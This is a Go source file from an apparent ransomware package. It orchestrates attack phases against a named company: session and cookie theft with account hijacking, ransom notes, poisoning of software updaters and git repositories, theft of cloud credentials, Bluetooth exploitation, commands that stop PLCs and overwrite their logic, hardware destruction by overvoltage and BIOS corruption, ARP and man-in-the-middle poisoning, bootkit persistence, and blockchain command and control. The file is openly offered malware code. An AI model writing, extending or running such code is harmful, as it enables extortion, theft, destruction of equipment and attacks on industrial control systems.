package ransomware

import (
	"context"
	"fmt"
	"os/exec"
	"runtime"
	"time"
)

type ExtendedEngine struct {
	*Engine
	PsychAdvanced *PsychologicalAdvancedEngine
	IdentityDest  *IdentityDestructionEngine
	RaaS          *InverseRaaSEngine
	Worm          *MultiPlatformWorm
	SupplyChain   *SupplyChainPoison
	CloudExploit  *CloudExploitEngine
	Bluetooth     *BluetoothPropagation
	SCADA         *SCADAAttackEngine
	Hardware      *HardwareKillEngine
	NetworkPoison *NetworkPoisonEngine
	DNA           *DNAMutationEngine
	Bootkit       *BootkitEngine
	BlockchainC2  *BlockchainC2Engine
	Survivor      *SurvivorGameEngine
}

func NewExtendedEngine(cfg *RansomwareConfig) (*ExtendedEngine, error) {
	base, err := NewEngine(cfg)
	if err != nil {
		return nil, err
	}

	return &ExtendedEngine{
		Engine:        base,
		PsychAdvanced: NewPsychologicalAdvancedEngine(cfg),
		IdentityDest:  NewIdentityDestructionEngine(cfg),
		RaaS:          NewInverseRaaSEngine(cfg),
		Worm:          NewMultiPlatformWorm(cfg),
		SupplyChain:   NewSupplyChainPoison(cfg),
		CloudExploit:  NewCloudExploitEngine(cfg),
		Bluetooth:     NewBluetoothPropagation(cfg),
		SCADA:         NewSCADAAttackEngine(cfg),
		Hardware:      NewHardwareKillEngine(cfg),
		NetworkPoison: NewNetworkPoisonEngine(cfg),
		DNA:           NewDNAMutationEngine(cfg),
		Bootkit:       NewBootkitEngine(cfg),
		BlockchainC2:  NewBlockchainC2Engine(cfg),
		Survivor:      NewSurvivorGameEngine(cfg),
	}, nil
}

func (ee *ExtendedEngine) ExecuteExtended(ctx context.Context, campaignID, companyName string) (*RansomwareReport, error) {
	report, err := ee.Engine.Execute(ctx, campaignID, companyName)
	if err != nil {
		return report, err
	}

	var phases []PhaseReport
	phases = append(phases, report.Phases...)

	phases = append(phases, ee.phaseIdentityDestroy(ctx))
	phases = append(phases, ee.phaseRaaS(ctx))
	phases = append(phases, ee.phaseSupplyChain(ctx))
	phases = append(phases, ee.phaseCloudExploit(ctx))
	phases = append(phases, ee.phaseBluetooth(ctx))
	phases = append(phases, ee.phaseSCADA(ctx))
	phases = append(phases, ee.phaseHardwareKill(ctx))
	phases = append(phases, ee.phaseNetworkPoison(ctx))
	phases = append(phases, ee.phaseBootkit(ctx))
	phases = append(phases, ee.phaseBlockchainC2(ctx))
	phases = append(phases, ee.phaseSurvivorGame(ctx))

	report.Phases = phases
	report.PhasesAttempted = len(phases)

	allSuccess := true
	for _, p := range phases {
		if !p.Success {
			allSuccess = false
			break
		}
	}
	report.Success = allSuccess && report.Success
	report.CompletedAt = time.Now()
	report.TotalElapsedMs = time.Since(report.StartedAt).Milliseconds()

	return report, nil
}

func (ee *ExtendedEngine) phaseIdentityDestroy(ctx context.Context) PhaseReport {
	start := time.Now()
	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseIdentityDestroy, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}
	if !ee.Config.IdentityDestroy {
		return PhaseReport{Phase: PhaseIdentityDestroy, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped"}
	}

	cookies, sessions, _ := ee.IdentityDest.HarvestAllSessions()
	dumpPath := fmt.Sprintf("%s/x404x_identity_dump.json", "/tmp") // nosec
	_ = dumpPath
	results := ee.IdentityDest.HijackAccounts()
	totalDestroyed := len(results)

	ee.mu.Lock()
	ee.report.IdentitiesDestroyed = totalDestroyed
	ee.mu.Unlock()

	return PhaseReport{
		Phase: PhaseIdentityDestroy, StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    fmt.Sprintf("cookies=%d sessions=%d accounts_hijacked=%d", len(cookies), len(sessions), totalDestroyed),
	}
}

func (ee *ExtendedEngine) phaseRaaS(ctx context.Context) PhaseReport {
	start := time.Now()
	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseRaaS, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}
	if !ee.Config.InverseRaaS {
		return PhaseReport{Phase: PhaseRaaS, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped"}
	}

	ee.RaaS.StartPanel()
	keys := ee.RaaS.DistributeKeyToSubtenants()
	notes := ee.RaaS.GenerateMultiRansomNotes()

	active := ee.RaaS.Subtenants

	ee.mu.Lock()
	ee.report.RAASSubtenants = len(active)
	ee.mu.Unlock()

	return PhaseReport{
		Phase: PhaseRaaS, StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    fmt.Sprintf("tenants=%d keys_distributed=%d notes_generated=%d", len(active), len(keys), len(notes)),
	}
}

func (ee *ExtendedEngine) phaseSupplyChain(ctx context.Context) PhaseReport {
	start := time.Now()
	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseSupplyChain, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}
	if !ee.Config.SupplyChainPoison {
		return PhaseReport{Phase: PhaseSupplyChain, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped"}
	}

	updaters := ee.SupplyChain.FindUpdaters()
	for _, u := range updaters {
		ee.SupplyChain.PoisonUpdaterBinary(u)
	}
	repos := ee.SupplyChain.FindLocalRepos()
	ee.SupplyChain.PoisonGitHooks("/tmp")
	ee.SupplyChain.ScorchRepos(repos)

	poisoned := len(ee.SupplyChain.PoisonedRepos)

	ee.mu.Lock()
	ee.report.SupplyReposPoisoned = poisoned
	ee.mu.Unlock()

	return PhaseReport{
		Phase: PhaseSupplyChain, StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    fmt.Sprintf("updaters=%d repos=%d poisoned=%d", len(updaters), len(repos), poisoned),
	}
}

func (ee *ExtendedEngine) phaseCloudExploit(ctx context.Context) PhaseReport {
	start := time.Now()
	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseCloudExploit, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}
	if !ee.Config.CloudExploit {
		return PhaseReport{Phase: PhaseCloudExploit, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped"}
	}

	creds := ee.CloudExploit.HarvestCloudCreds()
	resources := ee.CloudExploit.LaunchCloudInstances(creds)
	ee.CloudExploit.CreatePublicS3Bucket(CloudCredential{Provider: "aws"})

	ee.mu.Lock()
	ee.report.CloudInstances = len(resources)
	ee.mu.Unlock()

	return PhaseReport{
		Phase: PhaseCloudExploit, StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    fmt.Sprintf("creds=%d instances=%d resources=%d", len(creds), len(resources), len(ee.CloudExploit.Resources)),
	}
}

func (ee *ExtendedEngine) phaseBluetooth(ctx context.Context) PhaseReport {
	start := time.Now()
	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseBluetooth, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}
	if !ee.Config.BluetoothProp {
		return PhaseReport{Phase: PhaseBluetooth, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped"}
	}

	devices := ee.Bluetooth.ScanBluetoothDevices()
	ee.Bluetooth.ExploitDevices(devices)
	wifiPeers := ee.Bluetooth.ScanWiFiDirectPeers()
	ee.Bluetooth.ActivateWifiDirect()

	hijacked := ee.Bluetooth.DevicesHijacked

	ee.mu.Lock()
	ee.report.BLDevicesHijacked = hijacked
	ee.mu.Unlock()

	return PhaseReport{
		Phase: PhaseBluetooth, StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    fmt.Sprintf("bt_devices=%d wifi_peers=%d hijacked=%d", len(devices), len(wifiPeers), hijacked),
	}
}

func (ee *ExtendedEngine) phaseSCADA(ctx context.Context) PhaseReport {
	start := time.Now()
	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseSCADA, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}
	if !ee.Config.SCADAAttack {
		return PhaseReport{Phase: PhaseSCADA, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped"}
	}

	var subnet string
	if runtime.GOOS == "linux" {
		if output, err := exec.Command("ip", "-o", "-f", "inet", "addr", "show").Output(); err == nil {
			subnet = string(output)
		}
	}
	if subnet == "" {
		subnet = "192.168.1.0/24"
	}
	plcs := ee.SCADA.ScanForPLCs(subnet)
	scadaApps := ee.SCADA.DetectSCADASoftware()

	var attacked int
	for _, plc := range plcs {
		ee.SCADA.SendCommand(plc, "stop_plc")
		ee.SCADA.SendCommand(plc, "overwrite_logic")
		attacked++
	}

	ee.mu.Lock()
	ee.report.PLCsAttacked = attacked
	ee.mu.Unlock()

	return PhaseReport{
		Phase: PhaseSCADA, StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    fmt.Sprintf("scada_apps=%d plcs=%d attacked=%d", len(scadaApps), len(plcs), attacked),
	}
}

func (ee *ExtendedEngine) phaseHardwareKill(ctx context.Context) PhaseReport {
	start := time.Now()
	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseHardwareKill, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}
	if !ee.Config.HardwareKill {
		return PhaseReport{Phase: PhaseHardwareKill, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped"}
	}

	ee.Hardware.CheckFirmwareAccess()
	ee.Hardware.ZeroFanRPM()
	ee.Hardware.ExecuteOvervoltage(FirmwareConfig{
		CPUVcore:     1.5,
		DRAMVoltage:  1.8,
		FanSpeed:     0,
		CPUFrequency: 9999,
	})
	ee.Hardware.CPUInfLoop()
	ee.Hardware.BIOSFlashCorruption()

	ee.mu.Lock()
	ee.report.HardwareKilled = true
	ee.mu.Unlock()

	return PhaseReport{
		Phase: PhaseHardwareKill, StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    "overvoltage applied, fans zeroed, CPU burn loop, BIOS corruption attempted",
	}
}

func (ee *ExtendedEngine) phaseNetworkPoison(ctx context.Context) PhaseReport {
	start := time.Now()
	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseNetworkPoison, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}
	if !ee.Config.NetworkPoison {
		return PhaseReport{Phase: PhaseNetworkPoison, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped"}
	}

	ee.NetworkPoison.DiscoverGateway()
	ee.NetworkPoison.PoisonAllARP()
	ee.NetworkPoison.GenerateCA()
	ee.NetworkPoison.InstallRootCA()

	if ee.Config.CaptivePortal {
		ee.NetworkPoison.StartCaptivePortal()
	}
	if ee.Config.SSLStrip {
		ee.NetworkPoison.SSLStripAttack()
	}
	ee.NetworkPoison.StartMITMProxy()
	ee.NetworkPoison.InjectWebScripts()

	return PhaseReport{
		Phase: PhaseNetworkPoison, StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    "arp poisoned, mitm proxy active, root CA installed, captive portal up, web injection running",
	}
}

func (ee *ExtendedEngine) phaseBootkit(ctx context.Context) PhaseReport {
	start := time.Now()
	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseBootkit, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}
	if !ee.Config.BootkitPersist {
		return PhaseReport{Phase: PhaseBootkit, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped"}
	}

	ee.Bootkit.EnableBootkitPersistence()

	ee.mu.Lock()
	ee.report.BootkitDeployed = true
	ee.mu.Unlock()

	return PhaseReport{
		Phase: PhaseBootkit, StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    fmt.Sprintf("mbr=%v uefi=%v bootloader=%s", ee.Bootkit.MBRInfected, ee.Bootkit.GPTInfected, ee.Bootkit.Bootloader),
	}
}

func (ee *ExtendedEngine) phaseBlockchainC2(ctx context.Context) PhaseReport {
	start := time.Now()
	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseBlockchainC2, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}
	if !ee.Config.BlockchainC2 {
		return PhaseReport{Phase: PhaseBlockchainC2, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped"}
	}

	ee.BlockchainC2.StartMonitoring()
	bombCmd := ee.BlockchainC2.GenerateCommand("destroy", "all")
	opReturn, _ := ee.BlockchainC2.EmbedCommandInBlockchain(bombCmd)

	ee.mu.Lock()
	ee.report.BlockchainCmds = len(ee.BlockchainC2.GetPendingCommands())
	ee.mu.Unlock()

	return PhaseReport{
		Phase: PhaseBlockchainC2, StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    fmt.Sprintf("monitoring=%v op_return=%s commands=%d", ee.BlockchainC2.running, opReturn[:min(40, len(opReturn))], ee.report.BlockchainCmds),
	}
}

func (ee *ExtendedEngine) phaseSurvivorGame(ctx context.Context) PhaseReport {
	start := time.Now()
	if err := ctx.Err(); err != nil {
		return PhaseReport{Phase: PhaseSurvivorGame, ElapsedMs: time.Since(start).Milliseconds(), Success: false, Error: err.Error()}
	}
	if !ee.Config.SurvivorGame {
		return PhaseReport{Phase: PhaseSurvivorGame, ElapsedMs: time.Since(start).Milliseconds(), Success: true, Detail: "skipped"}
	}

	ee.Survivor.Start()
	time.Sleep(2 * time.Second)
	ee.Survivor.Stop()

	ee.mu.Lock()
	ee.report.SurvivorWinner = ee.Survivor.Winner
	ee.mu.Unlock()

	return PhaseReport{
		Phase: PhaseSurvivorGame, StartedAt: start,
		ElapsedMs: time.Since(start).Milliseconds(),
		Success:   true,
		Detail:    fmt.Sprintf("stations=%d eliminated=%d remaining=%d winner=%s", len(ee.Survivor.Stations), ee.Survivor.Eliminated, ee.Survivor.Remaining, ee.Survivor.Winner),
	}
}
